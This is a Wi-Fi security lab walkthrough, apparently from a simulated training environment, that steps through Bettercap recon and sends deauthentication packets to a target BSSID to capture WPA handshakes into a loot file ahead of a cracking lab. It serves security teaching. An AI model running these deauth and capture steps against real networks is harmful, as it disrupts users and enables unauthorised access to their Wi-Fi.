# Summary
In this lab we aim to learn more and become more familiarized with Bettercap.

# A Deeper Dive Into Bettercap
Select "Bettercap Recon" from the menu. Allow up to 30 seconds to initialize the network. 

![[Pasted image 20250318001438.png]]

Note: normally, when using Bettercap with physical network cards, it is necessary to use `airmon-ng check kill` to kill processes that may interfere with Bettercap. However, running this command in the mininet-wifi network is unnecessary and may cause the environment to fail. 

Start by setting the interface `a-wlan0` into monitor mode to analyze the wireless spectrum around us.

```bash
airmon-ng start a-wlan0
```

If the following prompt appears, input "**y**" and hit enter. 

![[Pasted image 20250318001702.png]]

Successful initialization will appear as pictured below.

![[Pasted image 20250318001730.png]]

Verify that the interface has been put into monitor mode using the following command:

```bash
ifconfig | grep flags
```

As pictured below, a-wlan0mon should now be present. 

![[Pasted image 20250318001757.png]]

Launch Bettercap with the following command. 

```bash
bettercap -iface a-wlan0mon
```

You will be greeted by a prompt of with the name of the network interface. 

![[Pasted image 20250318001832.png]]

Access the help menu by typing: 

```
help
```

Read this to get a better understanding of the tool. 

![[Pasted image 20250318001920.png]]

This lab uses Bettercap's Wi-Fi module. Type the following to view a help menu specific to this module: 

```
help wifi
```

![[Pasted image 20250318002007.png]]

Configure the console for a more convenient way to view your attack. 

```bash
set wifi.show.sort clients desc
set ticker.commands 'clear; wifi.show'
ticker on
set wifi.show.sort clients desc
```

After running the commands, you should see the following on your screen. 

![[Pasted image 20250318002113.png]]

Set the handshakes file.

```bash
set wifi.handshakes.file /Wifi-Forge/Framework/loot/4whs
```

Finally, enable Wi-Fi recon:

```bash
wifi.recon on
```

Data regarding local networks will fill your screen. Bettercap may take up to a minute to discover all the networks in the lab. 

Force the interface to focus on networks operating on channel 6. 

```bash
wifi.recon.channel 6
```

Send deauth packets

```
wifi.deauth 76:df:71:67:40:2b
```

Bettercap will display the number of handshakes it captures. Wait until at least one handshake is captured. 

![[Pasted image 20250318000519.png]]

Disable the Wi-Fi recon module using

```bash
wifi.recon off
```


Note: If this invocation produces an error about setting TX power, see the notes section of this lab. 

Disable console logging using the following command. Note that the monitor interface has not stopped channel hopping. 

```bash
events.stream off
```

Your final packet count may differ from the screenshot below. Note the BSSID of CORP_NET before killing bettercap - you'll need it for the next lab! 

Type ```exit``` to leave bettercap. Use the main_menu command to return to the main menu and onto the next lab. 

NEXT LAB: [[Lab 03 - Packet Capture to HCCAPX Conversion and Hashcat Cracking]]